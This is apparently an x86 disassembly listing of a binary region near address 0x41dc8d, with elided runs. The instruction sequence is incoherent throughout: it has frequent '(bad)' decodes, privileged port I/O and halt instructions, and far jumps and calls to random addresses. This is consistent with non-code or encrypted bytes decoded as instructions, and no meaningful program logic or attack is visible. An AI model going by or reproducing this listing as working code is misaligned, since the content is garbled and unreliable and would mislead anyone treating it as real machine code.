  41dc8d:	ja     0x41dcb6
  41dc8f:	mov    al,0x95
  41dc91:	cmp    DWORD PTR [edi+0x19b4b0f3],ecx
  41dc97:	mov    ch,0xb8
  41dc99:	dec    esi
  41dc9a:	or     ecx,DWORD PTR [esp+ebp*8]
  41dc9d:	cmp    ebx,DWORD PTR [eax+0x209ffdd3]
  41dca3:	je     0x41dc88
  41dca5:	xchg   BYTE PTR [ebp+0x7a],al
  41dca8:	popf   
  41dca9:	push   0xffffff9f
  41dcab:	loopne 0x41dd01
  41dcad:	leave  
  41dcae:	or     al,0x7f
  41dcb0:	pop    eax
  41dcb1:	jo     0x41dc68
  41dcb3:	xor    DWORD PTR [edi-0xb91e6d4],eax
  41dcb9:	push   0x3853dacc
  41dcbe:	imul   ebx,DWORD PTR [eiz*4-0x30e3a1a],0x818bd985
  41dcc9:	dec    esp
  41dcca:	dec    BYTE PTR [ebp+0x66]
  41dccd:	pop    ebp
  41dcce:	adc    eax,DWORD PTR [ebx]
  41dcd0:	popf   
  41dcd1:	mov    ecx,0x8af111ae
  41dcd6:	mov    WORD PTR [eax-0x5e01837c],es
  41dcdc:	sbb    ah,BYTE PTR [esp+ebx*2]
  41dcdf:	sub    BYTE PTR ds:0x86e1bbd5,ah
  41dce5:	cld    
  41dce6:	loope  0x41dcac
  41dce8:	adc    DWORD PTR [edx+0x59968b24],edx
  41dcee:	cmp    edx,DWORD PTR ds:0xc8a4b23e
  41dcf4:	and    DWORD PTR [ebx],esp
  41dcf6:	xchg   ecx,eax
  41dcf7:	mov    dl,0x4b
  41dcf9:	dec    ebp
  41dcfa:	mov    cl,0xf
  41dcfc:	sub    BYTE PTR [eax],bh
  41dcfe:	ret    
  41dcff:	push   esp
  41dd00:	sbb    BYTE PTR [edx],dl
  41dd02:	aad    0xf5
  41dd04:	je     0x41dc86
  41dd06:	pushf  
  41dd07:	add    al,0xd0
  41dd09:	data16 stc 
  41dd0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd0c:	out    0xf,eax
  41dd0e:	pop    edx
  41dd0f:	ss enter 0x8a20,0x44
  41dd14:	pop    ds
  41dd15:	push   edi
  41dd16:	xchg   esp,eax
  41dd17:	imul   edi,ecx,0xfffffff6
  41dd1a:	out    dx,al
  41dd1b:	xor    bh,bh
  41dd1d:	enter  0xf80,0xa2
  41dd21:	mov    al,ds:0x4f149ca4
  41dd26:	popa   
  41dd27:	xchg   ecx,eax
  41dd28:	xchg   edx,eax
  41dd29:	aaa    
  41dd2a:	push   esi
  41dd2b:	es ins DWORD PTR es:[edi],dx
  41dd2d:	jbe    0x41dd7d
  41dd2f:	inc    edx
  41dd30:	ins    DWORD PTR es:[edi],dx
  41dd31:	fidiv  WORD PTR [edi]
  41dd33:	jp     0x41dd09
  41dd35:	dec    esi
  41dd36:	mov    WORD PTR [edi+0x6b],gs
  41dd39:	ss ss rcr ah,1
  41dd3d:	cmp    DWORD PTR [edx],ebx
  41dd3f:	push   ecx
  41dd40:	or     edx,DWORD PTR [ecx+0x9]
  41dd43:	xchg   ebp,eax
  41dd44:	xlat   BYTE PTR ds:[ebx]
  41dd45:	shr    BYTE PTR [esi+0x68054449],1
  41dd4b:	adc    bl,BYTE PTR [ebx+0x64e0262e]
  41dd51:	sar    esi,0x50
  41dd54:	fcomp  st(4)
  41dd56:	repnz xchg esi,eax
  41dd58:	arpl   WORD PTR [ebx+0x32],dx
  41dd5b:	mov    ah,0x5f
  41dd5d:	ror    ch,0xab
  41dd60:	test   BYTE PTR [ecx-0x7a],ah
  41dd63:	std    
  41dd64:	and    ebp,DWORD PTR [esi+0x6274738]
  41dd6a:	sub    BYTE PTR [ebx],dl
  41dd6c:	sub    BYTE PTR [ecx+eiz*4-0x7d],bl
  41dd70:	loope  0x41dd67
  41dd72:	xor    eax,0xeb10f156
  41dd77:	cmp    eax,0x3572118e
  41dd7c:	sub    dh,ch
  41dd7e:	add    ebp,0xfffffff0
  41dd81:	xor    BYTE PTR [edi-0x3400b980],cl
  41dd87:	push   0x2d6f8e14
  41dd8c:	jmp    0x41ddc3
  41dd8e:	idiv   esi
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	dec    eax
  41de01:	loope  0x41de61
  41de03:	scas   al,BYTE PTR es:[edi]
  41de04:	test   BYTE PTR ds:0x1040001,bh
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	jnp    0x41ddd1
  41de0e:	mov    ch,dh
  41de10:	ror    DWORD PTR [ebx-0x6f],cl
  41de13:	jmp    0x41de00
  41de15:	or     BYTE PTR [edx],al
  41de17:	retf   
  41de18:	test   eax,0x77766765
  41de1d:	arpl   WORD PTR cs:[esi],si
  41de20:	sahf   
  41de21:	in     al,dx
  41de22:	add    BYTE PTR [ebx],cl
  41de24:	pushf  
  41de25:	and    DWORD PTR ds:0xae731062,ebp
  41de2b:	mov    edi,0x6834d5e8
  41de30:	adc    DWORD PTR [edi+0x4fea63d7],esp
  41de36:	sbb    eax,0x8c5fa9c2
  41de3b:	push   ebp
  41de3c:	ror    DWORD PTR [eax+0x48],0x7c
  41de40:	cwde   
  41de41:	cli    
  41de42:	scas   al,BYTE PTR es:[edi]
  41de43:	test   al,0x6f
  41de45:	js     0x41de82
  41de47:	in     al,0xfb
  41de49:	xchg   DWORD PTR [edx],edx
  41de4b:	iret   
  41de4c:	fistp  QWORD PTR [ecx+eiz*2]
  41de4f:	jmp    0x7b6a:0x1b527656
  41de56:	jnp    0x41de4a
  41de58:	or     BYTE PTR [edx],bh
  41de5a:	scas   eax,DWORD PTR es:[edi]
  41de5b:	xor    bh,BYTE PTR [edx-0x71]
  41de5e:	test   al,0xd1
  41de60:	pop    esp
  41de62:	les    edx,FWORD PTR [edx]
  41de64:	pop    eax
  41de65:	call   0xf7762ac1
  41de6a:	rcl    eax,cl
  41de6c:	sahf   
  41de6d:	in     eax,0x62
  41de6f:	mov    ch,0xa7
  41de71:	dec    esp
  41de72:	bound  edi,QWORD PTR [edx+0x7e]
  41de75:	push   esp
  41de76:	repz out dx,eax
  41de78:	fcmove st,st(3)
  41de7a:	jp     0x41ded1
  41de7c:	enter  0x9878,0x70
  41de80:	dec    edi
  41de81:	sub    BYTE PTR [eax-0x3f],ah
  41de84:	je     0x41dee9
  41de86:	shr    bl,1
  41de88:	arpl   WORD PTR [ebp+0x19],sp
  41de8b:	cmp    bh,BYTE PTR [ebp-0x3f]
  41de8e:	mov    al,0xab
  41de90:	out    dx,al
  41de91:	mov    ds:0x67f9ac0f,eax
  41de96:	cmp    BYTE PTR ds:0x83f33b64,ch
  41de9c:	shr    ecx,1
  41de9e:	mov    BYTE PTR [esi-0x6d],al
  41dea1:	adc    DWORD PTR [eax],ebx
  41dea3:	mov    bl,0xf7
  41dea5:	jmp    0x41dec1
  41dea7:	fnstcw WORD PTR [ebp+ebx*1-0xc]
  41deab:	jo     0x41df0a
  41dead:	or     DWORD PTR [ebp+ebx*8+0x69],ecx
  41deb1:	das    
  41deb2:	rcl    bl,0xd2
  41deb5:	sar    BYTE PTR [edi-0x1f7bd940],0xcd
  41debc:	retf   
  41debd:	jp     0x41de4f
  41debf:	adc    eax,0x2afff0f6
  41dec4:	jmp    0x41deb8
  41dec6:	pop    ds
  41dec7:	(bad)  
  41dec8:	in     al,0xd9
  41deca:	xor    bl,cl
  41decc:	dec    ecx
  41decd:	pop    eax
  41dece:	cs jb  0x41dee6
  41ded1:	adc    dh,BYTE PTR [esi+0x3c7d2672]
  41ded7:	xchg   edx,eax
  41ded8:	inc    edi
  41ded9:	aas    
  41deda:	in     al,0x38
  41dedc:	cmp    BYTE PTR [eax-0x4cc52246],0x61
  41dee3:	mov    esi,0xb738e75f
  41dee8:	jno    0x41df1e
  41deea:	or     DWORD PTR [edi+0x318a98b8],edi
  41def0:	mov    dh,0x49
  41def2:	push   esp
  41def3:	pop    ds
  41def4:	pop    ecx
  41def5:	int3   
  41def6:	mov    edx,0x9660e3b7
  41defb:	xor    esi,DWORD PTR [edx+0x3eeee82f]
  41df01:	shr    BYTE PTR [esi],1
  41df03:	push   ecx
  41df04:	and    BYTE PTR [eax-0x30],0x16
  41df08:	jmp    0xa72d:0xb4eaedfd
  41df0f:	leave  
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x4edc9ce9
  41df82:	in     al,0xbc
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	or     al,0x8
  41df8e:	push   0xaea91cff
  41df93:	mov    ch,0x3b
  41df95:	fcom   DWORD PTR [edx-0x7178d4b2]
  41df9b:	cld    
  41df9c:	into   
  41df9d:	repz aaa 
  41df9f:	adc    ebx,DWORD PTR [ebp-0x60fd545d]
  41dfa5:	(bad)  
  41dfa6:	js     0x41dfa7
  41dfa8:	outs   dx,BYTE PTR ds:[esi]
  41dfa9:	lods   eax,DWORD PTR ds:[esi]
  41dfaa:	xlat   BYTE PTR ds:[ebx]
  41dfab:	scas   eax,DWORD PTR es:[edi]
  41dfac:	stc    
  41dfad:	test   bh,cl
  41dfaf:	test   edi,ecx
  41dfb1:	pop    ds
  41dfb2:	ffreep st(5)
  41dfb4:	(bad)  
  41dfb5:	push   ebp
  41dfb6:	gs mov dh,0xf
  41dfb9:	xor    eax,0x19e29170
  41dfbe:	not    DWORD PTR [ebp-0x273c414b]
  41dfc4:	xchg   esi,eax
  41dfc5:	(bad)  
  41dfc6:	sub    BYTE PTR [edx],ah
  41dfc8:	sub    BYTE PTR [edx+0x48dfec94],ch
  41dfce:	or     DWORD PTR [ebx+0x12c2bb10],ecx
  41dfd4:	dec    esp
  41dfd5:	fnsave [edx+0x4652798a]
  41dfdb:	jge    0x41e016
  41dfdd:	daa    
  41dfde:	je     0x41df64
  41dfe0:	mov    bh,0xaa
  41dfe2:	(bad)  
  41dfe3:	test   al,0xe1
  41dfe5:	jne    0x41df8c
  41dfe7:	add    eax,0x7565b6fd
  41dfec:	clc    
  41dfed:	or     eax,0x5481e78f
  41dff2:	or     DWORD PTR [esp],ecx
  41dff5:	adc    DWORD PTR [edi+esi*1-0x26],0xc3bf5293
  41dffd:	out    dx,eax
  41dffe:	mov    ?,WORD PTR ds:0x89a60b69
  41e004:	ds gs out 0xb8,al
  41e008:	hlt    
  41e009:	iret   
  41e00a:	inc    ecx
  41e00b:	shl    DWORD PTR [edx-0x51],cl
  41e00e:	mov    al,ds:0xd4404ae8
  41e013:	(bad)  
  41e014:	fst    QWORD PTR [eax+0xe]
  41e017:	ret    
  41e018:	and    eax,0xf2d1cd46
  41e01d:	ss inc ebp
  41e01f:	inc    eax
  41e020:	ret    0x960f
  41e023:	lods   al,BYTE PTR ds:[esi]
  41e024:	adc    al,0x34
  41e026:	sbb    eax,0x409dfd23
  41e02b:	fwait
  41e02c:	or     al,0x90
  41e02e:	ss xchg ebp,eax
  41e030:	lea    ecx,[eax+eax*2]
  41e033:	jno    0x41e00d
  41e035:	aad    0xda
  41e037:	fcomip st,st(5)
  41e039:	fwait
  41e03a:	mov    bl,0x76
  41e03c:	sbb    eax,0xfa8d8bdc
  41e041:	std    
  41e042:	push   ecx
  41e043:	sub    ebx,DWORD PTR [esi+ecx*1-0x68]
  41e047:	ds or  ecx,esp
  41e04a:	jecxz  0x41dfee
  41e04c:	fcom   st(7)
  41e04e:	(bad)  
  41e04f:	fsub   st,st(6)
  41e051:	fist   DWORD PTR [ecx]
  41e053:	test   eax,0xdf6d9b8d
  41e058:	xchg   ebp,eax
  41e059:	jae    0x41e0c8
  41e05b:	sub    BYTE PTR [edx+eiz*4-0x31],dl
  41e05f:	jmp    0xc695:0xc6f99572
  41e066:	xchg   BYTE PTR [esi-0x46],al
  41e069:	adc    BYTE PTR [ecx+0x4d91b896],bl
  41e06f:	pop    eax
  41e070:	and    BYTE PTR [edx],dh
  41e072:	repnz cld 
  41e074:	in     eax,0xb1
  41e076:	lds    ecx,FWORD PTR [esi-0x3]
  41e079:	cdq    
  41e07a:	mov    eax,ds:0x5626ea77
  41e07f:	xchg   edx,eax
  41e080:	or     eax,0x517eb2bc
  41e085:	dec    esi
  41e086:	or     ah,BYTE PTR [esi]
  41e088:	inc    edi
  41e089:	or     dl,BYTE PTR [edx+0x33]
  41e08c:	call   0x0:0xc2b7e8
	...
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	jo     0x41e14f
  41e102:	jmp    0x41e098
  41e104:	mov    WORD PTR [edi],?
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	inc    eax
  41e10d:	aad    0x1e
  41e10f:	in     eax,0x10
  41e111:	gs jo  0x41e132
  41e114:	jb     0x41e14c
  41e116:	sbb    al,0xbf
  41e118:	stos   DWORD PTR es:[edi],eax
  41e119:	adc    DWORD PTR [bx+si-0x6342],eax
  41e11e:	push   edx
  41e11f:	mov    eax,DWORD PTR [eax+edi*1+0x2fc0cfbf]
  41e126:	loope  0x41e186
  41e128:	jno    0x41e0b2
  41e12a:	stc    
  41e12b:	lea    esp,[ebx-0x4e32f9d9]
  41e131:	mov    ch,0xd7
  41e133:	test   BYTE PTR [edi],0xb2
  41e136:	and    esi,DWORD PTR [eax+0x64cd6228]
  41e13c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e13d:	jecxz  0x41e103
  41e13f:	fdivrp st(0),st
  41e141:	sub    eax,0x5a8e898a
  41e146:	cli    
  41e147:	pusha  
  41e148:	cmp    al,cl
  41e14a:	in     al,dx
  41e14b:	imul   BYTE PTR [esi+edx*8-0x7a]
  41e14f:	cmc    
  41e150:	lock xor dl,BYTE PTR [eax+0x5a]
  41e154:	shl    ebx,0x17
  41e157:	mov    dh,0x5a
  41e159:	lods   eax,DWORD PTR ds:[esi]
  41e15a:	mov    al,0x8e
  41e15c:	adc    esi,DWORD PTR [edi+0x55ef669d]
  41e162:	(bad)  
  41e163:	es aad 0x56
  41e166:	aas    
  41e167:	je     0x41e0f2
  41e169:	rcr    BYTE PTR [eax],1
  41e16b:	pop    esi
  41e16c:	enter  0xf047,0x74
  41e170:	jle    0x41e1c9
  41e172:	push   es
  41e173:	xor    BYTE PTR [ecx],dh
  41e175:	es aaa 
  41e177:	je     0x41e169
  41e179:	inc    edi
  41e17a:	sahf   
  41e17b:	pusha  
  41e17c:	mov    DWORD PTR [ecx+eax*2+0x39],edx
  41e180:	retf   0xe10b
  41e183:	popa   
  41e184:	pop    ebp
  41e185:	push   ss
  41e186:	inc    ebp
  41e187:	dec    esp
  41e188:	lahf   
  41e189:	mov    edi,0x406bd4ea
  41e18e:	jp     0x41e1b8
  41e190:	outs   dx,DWORD PTR ds:[esi]
  41e191:	mov    esp,0x6466afce
  41e196:	pop    eax
  41e197:	sub    al,0xe2
  41e199:	xor    eax,0x4f3a7f00
  41e19e:	shr    DWORD PTR [edi-0x5f88e0a6],cl
  41e1a4:	std    
  41e1a5:	repnz sti 
  41e1a7:	inc    esp
  41e1a8:	pop    ss
  41e1a9:	shl    al,0x43
  41e1ac:	sbb    ebp,DWORD PTR [eax*1-0x10b59700]
  41e1b3:	sub    dh,BYTE PTR [esi+0x1c]
  41e1b6:	mov    dl,0xa6
  41e1b8:	scas   eax,DWORD PTR es:[edi]
  41e1b9:	mov    edx,DWORD PTR [edi+0x5c028e3f]
  41e1bf:	xor    eax,DWORD PTR [eax]
  41e1c1:	test   BYTE PTR [ebp-0x16076bda],0xea
  41e1c8:	xchg   edx,eax
  41e1c9:	mov    al,0x56
  41e1cb:	push   0x8135e04c
  41e1d0:	enter  0x55e1,0xc7
  41e1d4:	and    DWORD PTR [eax+ebx*1],eax
  41e1d7:	ds aaa 
  41e1d9:	das    
  41e1da:	jmp    0x6ae24f34
  41e1df:	stc    
  41e1e0:	sub    cl,bh
  41e1e2:	jecxz  0x41e205
  41e1e4:	xor    bl,BYTE PTR [edi+0xc]
  41e1e7:	icebp  
  41e1e8:	inc    ebx
  41e1e9:	ins    BYTE PTR es:[edi],dx
  41e1ea:	pop    edi
  41e1eb:	mov    ecx,0x67f00e7f
  41e1f0:	in     al,0x8e
  41e1f2:	test   DWORD PTR ds:0x2dd2fd41,ebp
  41e1f8:	adc    dh,al
  41e1fa:	dec    ebp
  41e1fb:	cdq    
  41e1fc:	mov    ebx,0x7a1012eb
  41e201:	mov    bh,0xc1
  41e203:	dec    eax
  41e204:	push   0x39
  41e206:	(bad)  
  41e208:	test   al,0xe4
  41e20a:	imul   esp,DWORD PTR [edx],0x13eb5360
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xeb
  41e281:	in     eax,0xfa
  41e283:	test   eax,0x14090
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	or     BYTE PTR [ecx-0x45],al
  41e28f:	inc    ebx
  41e290:	ret    
  41e291:	cdq    
  41e292:	pop    ss
  41e293:	mov    DWORD PTR [edi-0x5957620f],esp
  41e299:	dec    edi
  41e29a:	mul    DWORD PTR [eax+0xaf4d88b]
  41e2a0:	cmp    dh,dh
  41e2a2:	hlt    
  41e2a3:	dec    eax
  41e2a4:	inc    esp
  41e2a5:	outs   dx,DWORD PTR ds:[esi]
  41e2a6:	lock or eax,0x37f2c54b
  41e2ac:	jb     0x41e2b2
  41e2ae:	test   al,0x33
  41e2b0:	push   edi
  41e2b1:	cmc    
  41e2b2:	test   eax,0xf61df411
  41e2b7:	jmp    DWORD PTR [ebp+0x19]
  41e2ba:	popf   
  41e2bb:	pop    es
  41e2bc:	sub    bh,BYTE PTR [ecx]
  41e2be:	push   ds
  41e2bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2c0:	aad    0x7b
  41e2c2:	or     esp,edx
  41e2c4:	sub    BYTE PTR [esi-0x7c],dl
  41e2c7:	mov    dh,dl
  41e2c9:	cmp    DWORD PTR [edx+0x4c6bb502],esi
  41e2cf:	pop    ss
  41e2d0:	enter  0x2a56,0xcc
  41e2d4:	aam    0xd1
  41e2d6:	bound  ebx,QWORD PTR [edi-0x3db56b17]
  41e2dc:	dec    edx
  41e2dd:	adc    ebp,0x37ac5555
  41e2e3:	outs   dx,DWORD PTR ds:[esi]
  41e2e4:	popf   
  41e2e5:	and    ebp,DWORD PTR [ebp+ebx*1-0x66]
  41e2e9:	cmp    BYTE PTR [ebp+0x531ce819],0x81
  41e2f0:	dec    bl
  41e2f2:	push   eax
  41e2f3:	inc    DWORD PTR [esp+esi*1]
  41e2f6:	dec    edi
  41e2f7:	cdq    
  41e2f8:	push   esi
  41e2f9:	adc    eax,0x2411e4d5
  41e2fe:	mov    eax,ds:0xe54e4675
  41e303:	or     cl,BYTE PTR [edx]
  41e305:	ja     0x41e354
  41e307:	bound  edx,QWORD PTR [ecx]
  41e309:	mov    ch,0x33
  41e30b:	push   ss
  41e30c:	idiv   BYTE PTR [edi+0x73be18]
  41e312:	jg     0x41e2bc
  41e314:	lods   eax,DWORD PTR ds:[esi]
  41e315:	dec    ecx
  41e316:	and    ah,cl
  41e318:	jp     0x41e302
  41e31a:	xor    DWORD PTR [ebx+0x68ece7ce],eax
  41e320:	inc    BYTE PTR [ebx-0xfc6021b]
  41e326:	inc    esp
  41e327:	fiadd  DWORD PTR [esp+ecx*1-0x18]
  41e32b:	xchg   esp,eax
  41e32c:	inc    ebx
  41e32d:	sub    al,0x61
  41e32f:	sbb    ah,bh
  41e331:	(bad)  
  41e332:	pop    ebp
  41e333:	mov    dh,0xe6
  41e335:	call   0x764d0e13
  41e33a:	mov    BYTE PTR ds:0xaf34b554,0x73
  41e341:	je     0x41e2fe
  41e343:	mov    dh,0x6b
  41e345:	cmp    ecx,0xbce949a3
  41e34b:	sub    al,0xe2
  41e34d:	stos   DWORD PTR es:[edi],eax
  41e34e:	inc    ebp
  41e34f:	loope  0x41e3ce
  41e351:	dec    edx
  41e352:	and    al,0x2a
  41e354:	ja     0x41e3a2
  41e356:	inc    eax
  41e357:	lock adc esi,esp
  41e35a:	out    0xa7,eax
  41e35c:	imul   BYTE PTR [edx-0x2b55b414]
  41e362:	push   es
  41e363:	xor    bh,dl
  41e365:	mov    DWORD PTR [ecx-0x3c],ebp
  41e368:	(bad)  
  41e369:	sub    eax,0xd20054bb
  41e36e:	jno    0x41e353
  41e370:	enter  0x7548,0x86
  41e374:	sub    ah,BYTE PTR [ebx]
  41e376:	push   0xe992f346
  41e37b:	mov    bl,0xc1
  41e37d:	inc    edx
  41e37e:	dec    esp
  41e37f:	out    dx,al
  41e380:	xor    al,0x3a
  41e382:	enter  0xe26c,0xe8
  41e386:	out    0x55,eax
  41e388:	push   ebx
  41e389:	jnp    0x41e373
  41e38b:	xor    edx,DWORD PTR [bx+si-0x79]
  41e38f:	add    DWORD PTR [eax],eax
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x18178e09
  41e403:	push   eax
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	adc    cl,0xd1
  41e40f:	sahf   
  41e410:	mov    ebp,0xaecb7db5
  41e415:	push   ebx
  41e416:	jb     0x41e39f
  41e418:	jmp    0xe809:0x73f4ac51
  41e41f:	call   0xc98adb75
  41e424:	stos   BYTE PTR es:[edi],al
  41e425:	call   DWORD PTR [edx+0x452659f2]
  41e42b:	mov    ebx,0xfa98838
  41e430:	jge    0x41e3ef
  41e432:	cmp    DWORD PTR [edi+0x58e3ef85],edi
  41e438:	jge    0x41e475
  41e43a:	mov    eax,0x25b545d
  41e43f:	bound  esi,QWORD PTR ds:0x4e27976
  41e445:	sar    cl,cl
  41e447:	icebp  
  41e448:	sbb    eax,DWORD PTR [ebx+0x6b9622e9]
  41e44e:	pop    ebp
  41e44f:	push   0x2e
  41e451:	mov    ecx,0xffaa1384
  41e456:	push   esi
  41e457:	xlat   BYTE PTR ds:[ebx]
  41e458:	push   DWORD PTR [edx+0x6f]
  41e45b:	rol    BYTE PTR [edx-0x518b62ca],cl
  41e461:	pop    ecx
  41e462:	fcmovne st,st(4)
  41e464:	stc    
  41e465:	mov    ds:0x4b56fa32,eax
  41e46a:	pop    ecx
  41e46b:	jmp    0xcda556d5
  41e470:	sbb    bl,BYTE PTR [eax]
  41e472:	aas    
  41e473:	lods   eax,DWORD PTR ds:[esi]
  41e474:	inc    ebp
  41e475:	call   0xbfee:0xd8b51654
  41e47c:	pop    es
  41e47d:	sub    edi,DWORD PTR [ebp-0x25]
  41e480:	inc    esi
  41e481:	jne    0x41e4a4
  41e483:	push   ecx
  41e484:	nop
  41e485:	mov    ah,0x44
  41e487:	aas    
  41e488:	lahf   
  41e489:	cmp    al,0xde
  41e48b:	inc    edi
  41e48c:	xor    cl,dl
  41e48e:	cmp    al,0x92
  41e490:	in     eax,dx
  41e491:	mov    edx,edx
  41e493:	inc    edi
  41e494:	enter  0xc76e,0xf7
  41e498:	fiadd  WORD PTR [ebp+ecx*4+0x3a2988bf]
  41e49f:	mov    al,0x73
  41e4a1:	sbb    eax,0x63a6bf6d
  41e4a6:	inc    BYTE PTR [ebx-0x6d]
  41e4a9:	aam    0xe2
  41e4ab:	add    DWORD PTR [ebp-0x6f],0x77d74b78
  41e4b2:	adc    al,0x6d
  41e4b4:	push   esp
  41e4b5:	mov    ch,0xf6
  41e4b7:	inc    esi
  41e4b8:	push   ebp
  41e4b9:	ins    BYTE PTR es:[edi],dx
  41e4ba:	fcomi  st,st(6)
  41e4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4bd:	cdq    
  41e4be:	stos   BYTE PTR es:[edi],al
  41e4bf:	sbb    eax,0x71b8024c
  41e4c4:	mov    esp,0xe783a781
  41e4c9:	sbb    bh,BYTE PTR [esi-0x71]
  41e4cc:	rcr    DWORD PTR [ebx],0xc4
  41e4cf:	lods   eax,DWORD PTR ds:[esi]
  41e4d0:	or     BYTE PTR [ebp+0x5a7d0140],cl
  41e4d6:	nop
  41e4d7:	cdq    
  41e4d8:	sbb    esi,DWORD PTR [ebx-0x40413a1]
  41e4de:	inc    esi
  41e4df:	pop    eax
  41e4e0:	or     dl,bh
  41e4e2:	bound  esp,QWORD PTR [ebp+0xff96bc8]
  41e4e8:	retf   0xf3ff
  41e4eb:	scas   al,BYTE PTR es:[edi]
  41e4ec:	mul    BYTE PTR [ebx+0x28]
  41e4ef:	adc    bh,cl
  41e4f1:	mov    al,0x9d
  41e4f3:	dec    eax
  41e4f4:	xchg   esp,eax
  41e4f5:	jno    0x41e56b
  41e4f7:	push   ebp
  41e4f8:	(bad)  
  41e4f9:	jmp    0x7131:0x576d292a
  41e500:	and    ebp,0x76f6b727
  41e506:	stos   BYTE PTR es:[edi],al
  41e507:	pop    eax
  41e508:	mov    dl,0x2f
  41e50a:	jp     0x41e502
  41e50c:	jl     0x41e4d8
  41e50e:	adc    ebx,DWORD PTR [ebx+0x0]
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5e4
  41e581:	mov    esp,0x42986109
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	stc    
  41e58d:	xchg   esp,eax
  41e58e:	ins    DWORD PTR es:[edi],dx
  41e58f:	xchg   ecx,eax
  41e590:	or     ebp,DWORD PTR [ecx-0x55]
  41e593:	mov    al,ds:0xc2ccf3da
  41e598:	retf   
  41e599:	adc    BYTE PTR [ecx],bl
  41e59b:	ins    BYTE PTR es:[edi],dx
  41e59c:	(bad)
  41e59f:	mov    ds:0xfcedc342,eax
  41e5a4:	data16 xor ch,BYTE PTR [edi-0x59]
  41e5a8:	and    cl,dl
  41e5aa:	xchg   ecx,eax
  41e5ab:	xor    eax,0xb5ce07d3
  41e5b0:	xor    eax,0x28362bc
  41e5b5:	jne    0x41e631
  41e5b7:	ret    
  41e5b8:	cli    
  41e5b9:	scas   eax,DWORD PTR es:[edi]
  41e5ba:	sub    eax,0xf410ab76
  41e5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5c0:	shr    cl,1
  41e5c2:	int3   
  41e5c3:	cmp    bl,BYTE PTR [edx+0x34ccbc1a]
  41e5c9:	inc    ecx
  41e5ca:	popa   
  41e5cb:	mov    esp,0xbee59482
  41e5d0:	add    DWORD PTR ds:0xfc949506,edi
  41e5d6:	mov    eax,0xd2c8d159
  41e5db:	lods   eax,DWORD PTR ds:[esi]
  41e5dc:	repnz pop ds
  41e5de:	jmp    0x41e598
  41e5e0:	pop    edx
  41e5e1:	xchg   bh,al
  41e5e3:	daa    
  41e5e4:	mov    dh,0x78
  41e5e6:	mov    ds:0xb1010490,al
  41e5eb:	ins    DWORD PTR es:[edi],dx
  41e5ec:	(bad)  
  41e5ed:	mov    esi,0xd95fbf6a
  41e5f2:	or     bl,bl
  41e5f4:	sbb    BYTE PTR [ebx-0x663a82e5],bh
  41e5fa:	das    
  41e5fb:	sti    
  41e5fc:	sbb    DWORD PTR [eax-0x60f3f8ab],ebx
  41e602:	mov    ch,0xe7
  41e604:	xor    ecx,DWORD PTR [ebp-0x792ce100]
  41e60a:	imul   ebx,edx,0xd9c2b0b5
  41e610:	push   ecx
  41e611:	int3   
  41e612:	in     al,dx
  41e613:	jmp    0xca9a:0x406d709d
  41e61a:	into   
  41e61b:	mov    esi,DWORD PTR [ecx+0x44648d27]
  41e621:	inc    eax
  41e622:	inc    esi
  41e623:	stos   BYTE PTR es:[edi],al
  41e624:	push   ss
  41e625:	jo     0x41e5dc
  41e627:	mov    ebp,0x2c918b13
  41e62c:	shl    BYTE PTR [eax-0x3cb33a4e],0x26
  41e633:	jmp    0xaeb82af4
  41e638:	fbstp  TBYTE PTR [edx+0x20]
  41e63b:	or     eax,0x98181cd3
  41e640:	jae    0x41e5f9
  41e642:	pop    edx
  41e643:	loopne 0x41e662
  41e645:	xor    eax,0x717a6de6
  41e64a:	and    eax,edi
  41e64c:	push   edx
  41e64d:	shl    DWORD PTR [edx+0x143d40b2],cl
  41e653:	mov    ebx,0xb3c154b2
  41e658:	mov    al,ds:0x263db748
  41e65d:	mov    al,ds:0x729c790f
  41e662:	in     al,dx
  41e663:	daa    
  41e664:	repz jns 0x41e619
  41e667:	(bad)  
  41e668:	and    ebp,esp
  41e66a:	inc    ebp
  41e66b:	int    0xd9
  41e66d:	inc    esp
  41e66e:	xchg   ebp,eax
  41e66f:	stc    
  41e670:	(bad)  
  41e671:	adc    BYTE PTR [edx],ah
  41e673:	cmp    dl,al
  41e675:	fwait
  41e676:	loopne 0x41e687
  41e678:	adc    al,0x4e
  41e67a:	xchg   esi,eax
